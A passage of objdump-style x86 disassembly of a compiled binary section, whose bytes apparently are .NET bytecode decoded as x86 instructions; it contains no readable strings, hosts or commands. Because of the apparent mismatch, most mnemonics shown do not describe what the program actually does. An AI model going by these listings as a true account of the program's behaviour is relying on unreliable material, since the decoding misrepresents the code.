  4036a9:	0a 28                	or     (%eax),%ch
  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 28                	or     (%eax),%ch
  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 78             	es jb  0x40374a
  4036d2:	23 00                	and    (%eax),%eax
  4036d4:	70 0a                	jo     0x4036e0
  4036d6:	dd 00                	fldl   (%eax)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	8a 23                	mov    (%ebx),%ah
  40372e:	00 70 28             	add    %dh,0x28(%eax)
  403731:	91                   	xchg   %eax,%ecx
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 f4 20 00       	and    $0x20f472,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 90                	jb     0x40370a
  40377a:	23 00                	and    (%eax),%eax
  40377c:	70 6f                	jo     0x4037ed
  40377e:	8c 00                	mov    %es,(%eax)
  403780:	00 06                	add    %al,(%esi)
  403782:	25 72 a6 23 00       	and    $0x23a672,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 b0 23 00       	and    $0x23b072,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 ba 23 00       	and    $0x23ba72,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 c0                	jb     0x40378d
  4037cd:	23 00                	and    (%eax),%eax
  4037cf:	70 14                	jo     0x4037e5
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 d4             	or     -0x2c(%edx),%dh
  4037d8:	23 00                	and    (%eax),%eax
  4037da:	70 28                	jo     0x403804
  4037dc:	96                   	xchg   %eax,%esi
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	d8 23                	fsubs  (%ebx)
  4037eb:	00 70 72             	add    %dh,0x72(%eax)
  4037ee:	e2 23                	loop   0x403813
  4037f0:	00 70 6f             	add    %dh,0x6f(%eax)
  4037f3:	95                   	xchg   %eax,%ebp
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 72 ee             	or     -0x12(%edx),%dh
  4037f9:	23 00                	and    (%eax),%eax
  4037fb:	70 72                	jo     0x40386f
  4037fd:	fa                   	cli
  4037fe:	23 00                	and    (%eax),%eax
  403800:	70 6f                	jo     0x403871
  403802:	95                   	xchg   %eax,%ebp
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 06 24 00       	and    $0x240672,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 10 24 00       	and    $0x241072,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 20 24 00       	and    $0x242072,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 2c             	or     0x2c(%edx),%dh
  403859:	24 00                	and    $0x0,%al
  40385b:	70 72                	jo     0x4038cf
  40385d:	20 24 00             	and    %ah,(%eax,%eax,1)
  403860:	70 6f                	jo     0x4038d1
  403862:	95                   	xchg   %eax,%ebp
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 36             	or     0x36(%edx),%dh
  403868:	24 00                	and    $0x0,%al
  40386a:	70 72                	jo     0x4038de
  40386c:	b0 23                	mov    $0x23,%al
  40386e:	00 70 6f             	add    %dh,0x6f(%eax)
  403871:	95                   	xchg   %eax,%ebp
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 42 24 00       	and    $0x244272,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 5a 24 00       	and    $0x245a72,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 6c 24 00       	and    $0x246c72,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 80 24 00       	and    $0x248072,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 94 24 00       	and    $0x249472,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 ee                	jb     0x4038e3
  4038f5:	20 00                	and    %al,(%eax)
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 9e 24 00       	and    $0x249e72,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 aa             	adc    %esi,-0x56(%edx)
  40399e:	24 00                	and    $0x0,%al
  4039a0:	70 28                	jo     0x4039ca
  4039a2:	8a 00                	mov    (%eax),%al
  4039a4:	00 0a                	add    %cl,(%edx)
  4039a6:	72 b0                	jb     0x403958
  4039a8:	24 00                	and    $0x0,%al
  4039aa:	70 28                	jo     0x4039d4
  4039ac:	68 00 00 0a 72       	push   $0x720a0000
  4039b1:	dc 24 00             	fsubl  (%eax,%eax,1)
  4039b4:	70 73                	jo     0x403a29
  4039b6:	a1 00 00 0a 0a       	mov    0xa0a0000,%eax
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 1a    	or     0x1a720907,%cl
  4039dd:	25 00 70 6f 83       	and    $0x836f7000,%eax
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 32                	jb     0x403a48
  403a16:	25 00 70 13 04       	and    $0x4137000,%eax
  403a1b:	dd 31                	fnsave (%ecx)
  403a1d:	00 00                	add    %al,(%eax)
  403a1f:	00 72 3a             	add    %dh,0x3a(%edx)
  403a22:	25 00 70 07 6f       	and    $0x6f077000,%eax
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 32                	jb     0x403a79
  403a47:	25 00 70 13 04       	and    $0x4137000,%eax
  403a4c:	dd 00                	fldl   (%eax)
  403a4e:	00 00                	add    %al,(%eax)
  403a50:	00 11                	add    %dl,(%ecx)
  403a52:	04 2a                	add    $0x2a,%al
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 ee             	add    %dh,-0x12(%edx)
  403b3e:	20 00                	and    %al,(%eax)
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
  403c1b:	0b dd                	or     %ebp,%ebx
  403c1d:	1e                   	push   %ds
